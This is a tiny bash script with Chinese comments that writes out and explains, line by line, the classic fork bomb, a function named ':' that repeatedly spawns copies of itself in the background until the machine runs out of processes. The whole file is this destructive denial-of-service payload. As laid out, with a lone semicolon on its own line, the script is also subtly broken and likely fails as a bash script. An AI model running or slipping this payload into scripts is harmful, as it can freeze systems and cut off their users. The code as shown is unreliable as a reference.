#!/bin/bash
#这是一个经典的fork炸弹
:()   #定义一个函数，函数名为冒号，没有可选参数。
{     #函数体开始
:|:&  #递归调用本函数，然后利用管道调用一个新进程（它要做的事情也是递归调用本函数），并将其放到后台执行
}     #函数体结束
;     #分隔作用
:     #调用函数：
